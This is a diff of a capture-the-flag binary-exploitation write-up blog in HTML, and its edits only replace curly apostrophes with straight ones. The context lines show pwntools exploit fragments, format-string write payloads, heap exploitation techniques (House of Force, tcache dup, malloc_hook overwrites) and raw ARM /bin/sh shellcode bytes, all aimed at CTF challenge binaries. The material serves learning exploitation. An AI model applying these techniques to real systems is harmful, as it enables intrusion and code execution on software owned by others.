@@ -124,7 +124,7 @@ io.sendline(payload2)
 io.interactive()
 </code></pre>
 <h2 id="pwn1-sctf-2016">pwn1_sctf_2016</h2>
-<p>C++ randomly shows up in this series, and I didn’t understand that <code>replace()</code> function at all.</p>
+<p>C++ randomly shows up in this series, and I didn't understand that <code>replace()</code> function at all.</p>
 <p>Moreover, if the input length exceeds 31 characters, it gets truncated, making it impossible to cause a stack overflow.</p>
 <p>After reading the solution, I learned that <code>replace()</code> replaces every <code>I</code> in the input with <code>you</code>.</p>
 <p>Combined with the fact that the <code>vuln()</code> function uses the dangerous <code>strcpy()</code> function at the end, I immediately knew what to do.</p>
@@ -298,7 +298,7 @@ print(io.recv())
 <p>Copyright Notice: This article is an original work by the blogger &quot;ShouCheng3&quot; on CSDN, following the CC 4.0 BY-SA copyright license. Please include the original source link and this notice when reprinting.
 Original link: <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51232724/article/details/124057645">https://blog.csdn.net/qq_51232724/article/details/124057645</a></p>
 </blockquote>
-<p><s>I don’t quite understand this ROP operation. Actually, replacing that <code>pop3</code> with another address doesn’t seem to make a difference.</s></p>
+<p><s>I don't quite understand this ROP operation. Actually, replacing that <code>pop3</code> with another address doesn't seem to make a difference.</s></p>
 <p>Now I understand—since this is 32-bit, the following three items serve as parameters and do not require register popping.</p>
 <pre><code class="language-python">from pwn import *
 from LibcSearcher import *
@@ -824,14 +824,14 @@ def exploit():
 <p>Skill 1: Using the printf function to view data on the stack:</p>
 <p><code>1234-%p-%p-%p-%p-%p-...-%p</code></p>
 <p>If this string is printed, all <code>%p</code> placeholders will be replaced by an address.</p>
-<p><s>However, I don’t know how these addresses relate to the ones seen during IDA debugging</s></p>
+<p><s>However, I don't know how these addresses relate to the ones seen during IDA debugging</s></p>
 <p>Skill 2: Modifying data at corresponding positions:</p>
 <p>For example, <code>%85d%7$n</code> changes the <strong>value</strong> at the address corresponding to the 7th <code>%p</code> to 85.</p>
 </blockquote>
 <p>The core of the problem is how to modify the value of the secret array. Change secret[0] to 85 or secret[1] to 68.</p>
 <p>The obvious exploitation points are the two scanf functions asking for address and wish, as well as the improperly formatted printf.</p>
-<p>Using the previous stack overflow approach definitely won’t work due to the presence of canary.</p>
-<p>The solution’s approach is to write the address of secret[0] into the first scanf, then use <code>printf('1234-%p-%p-%p-%p-%p-...-%p')</code> and observe that the previously written address appears at the 7th <code>%p</code>. After restarting the program, use <code>printf('%85d%7$n')</code>.</p>
+<p>Using the previous stack overflow approach definitely won't work due to the presence of canary.</p>
+<p>The solution's approach is to write the address of secret[0] into the first scanf, then use <code>printf('1234-%p-%p-%p-%p-%p-...-%p')</code> and observe that the previously written address appears at the 7th <code>%p</code>. After restarting the program, use <code>printf('%85d%7$n')</code>.</p>
 <p>Then, for the spell input part, <code>mmap</code> is a memory mapping function with executable content, so a one-line shellcode is directly used.</p>
 <pre><code class="language-python">io.sendline(asm(shellcraft.sh()))
 </code></pre>
@@ -887,7 +887,7 @@ io.recv()
 io.sendline('123456')
 io.interactive()
 </code></pre>
-<p>Exploit without using the tool <s>(though I don’t fully understand the underlying details)</s>:</p>
+<p>Exploit without using the tool <s>(though I don't fully understand the underlying details)</s>:</p>
 <h3 id="Updated-on-2-25">Updated on 2/25</h3>
 <p><code>$n</code> represents the number of bytes successfully output previously, which in this case is four integers, i.e., <code>0x10</code>.</p>
 <p>Earlier, we calculated the offset to the input as 10, so starting from <code>%10</code>, we write <code>0x10</code> to the addresses <code>0x804c044</code> to <code>0x804c047</code>.</p>
@@ -1174,7 +1174,7 @@ def exploit():
 <img src = 'https://img.junyu33.me/blog/bin_ctf/image-20220910105202943.png'>
 <p>Then, at <code>rbp</code>, change the last 16 bits of <code>__libc_csu_init</code> to the last 16 bits of <code>target_addr</code>. At <code>[rbp] + 0x18</code>, change <code>**([rbp] + 0x18)</code> to <code>**([rbp] + 0x18) + 2</code> to prepare for modifying the middle 8 bits of <code>__libc_csu_init</code>.</p>
 <blockquote>
-<p>Actually, simply changing <code>**([rbp] + 0x18)</code> to <code>**([rbp] + 0x18) + 2</code> is sufficient; the first step doesn’t really have any effect.</p>
+<p>Actually, simply changing <code>**([rbp] + 0x18)</code> to <code>**([rbp] + 0x18) + 2</code> is sufficient; the first step doesn't really have any effect.</p>
 </blockquote>
 <p>During the third format string, calculate the offset of <code>*([rbp] + 0x18)</code> and change the middle 8 bits of <code>__libc_csu_init</code> to the middle 8 bits of <code>target_addr</code>. At this point, <code>__libc_csu_init</code> becomes <code>key</code>.</p>
 <img src = 'https://img.junyu33.me/blog/bin_ctf/image-20220910110401145.png'>
@@ -1836,7 +1836,7 @@ struct _IO_FILE_complete
 <h3 id="gyctf-2020-force—House-of-Force-realloc-hook">gyctf_2020_force—House of Force + realloc_hook</h3>
 <p>Initially, I directly overwrote <code>__malloc_hook</code> with a <code>one_gadget</code>, but it crashed again. (One-gadgets often fail...)</p>
 <p>Then I switched to using <code>realloc</code>, and by randomly pushing a few registers, it worked.</p>
-<p>You can refer to this master’s article to understand the conditions required for exploiting <code>one_gadget</code>: <a target="_blank" rel="noopener" href="http://taqini.space/2020/04/29/about-execve/">http://taqini.space/2020/04/29/about-execve/</a></p>
+<p>You can refer to this master's article to understand the conditions required for exploiting <code>one_gadget</code>: <a target="_blank" rel="noopener" href="http://taqini.space/2020/04/29/about-execve/">http://taqini.space/2020/04/29/about-execve/</a></p>
 <pre><code class="language-python">def exploit():
    libc_base = add(0x200000, b'1') - 0x10 + 0x201000
    libc_sys = libc_base + libc.sym['system']
@@ -2004,7 +2004,7 @@ dele(3)
    io.sendline('4869')
 </code></pre>
 <h3 id="ciscn-2019-final-3-—-tcache-dup">ciscn_2019_final_3 — tcache dup</h3>
-<p>The knowledge point isn’t difficult, but the implementation is quite tricky.</p>
+<p>The knowledge point isn't difficult, but the implementation is quite tricky.</p>
 <p>A key point is that if the tcache and unsortedbin pointers are the same, free the tcache first, then free the unsortedbin. This allows allocating to a libc address after two mallocs.</p>
 <pre><code class="language-python">def exploit():
    gift = add(0, 0x18, b'a')
@@ -2446,7 +2446,7 @@ Original link: <a target="_blank" rel="noopener" href="https://blog.csdn.net/Inv
 <li>Control the fd and bk pointers of the later created smallbin; set fd to the <code>prev_size</code> part of the previous smallbin, and set bk to the location where you want to overwrite the libc address (does not need to be a multiple of 0x10)</li>
 <li><code>calloc(0xf0)</code></li>
 </ul>
-<p>Here’s an explanation for why it is <code>add rsp 0x48; ret</code>:</p>
+<p>Here's an explanation for why it is <code>add rsp 0x48; ret</code>:</p>
 <p>In the final step when calling calloc, the stack layout is as follows, with rsp offset by 0x18 from the input:</p>
 <img src='https://img.junyu33.me/blog/bin_ctf/image-20221023161650586.png'>
 <p>By the time <code>call malloc_hook(rax)</code> is reached, the offset changes from 0x18 to 0x40, and the call itself pushes an additional 0x8 onto the stack. Therefore, 0x40 + 0x8 = 0x48.</p>
@@ -2529,7 +2529,7 @@ def exploit():
 <h2 id="libc-2-35">libc 2.35</h2>
 <h3 id="corctf2022-cshell2—Heap-Overflow-Decrypt-Safe-Linking-Tcache-Poisoning">corctf2022_cshell2—Heap Overflow + Decrypt Safe-Linking + Tcache Poisoning</h3>
 <p>The I/O is incredibly difficult to debug; it's easy to run into errors like <code>sh: 1: 2: not found</code> just when success seems within reach.</p>
-<p>You can’t even debug it!!!</p>
+<p>You can't even debug it!!!</p>
 <p>Ironically: <code>corctf&#123;m0nk3y1ng_0n_4_d3bugg3r_15_th3_b35T!!!&#125;</code></p>
 <pre><code class="language-python"># all io.sendline() or the stream will get stuck
 
@@ -2831,7 +2831,7 @@ if __name__ == '__main__':
 </code></pre>
 <h2 id="inctf2018-wARMup-—-ARM-Shellcode">inctf2018_wARMup — ARM Shellcode</h2>
 <p>Note that in ARM architecture, the .bss section is executable, allowing direct placement of shellcode on the bss segment.</p>
-<p>Originally intended to use shellcraft, but it failed. Ended up grabbing a piece of shellcode from the internet which worked, though it didn’t pass locally.</p>
+<p>Originally intended to use shellcraft, but it failed. Ended up grabbing a piece of shellcode from the internet which worked, though it didn't pass locally.</p>
 <p><code>b'\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78'</code></p>
 <pre><code class="language-python">from pwn import *
 elf_path = '/home/junyu33/Desktop/tmp/wARMup'
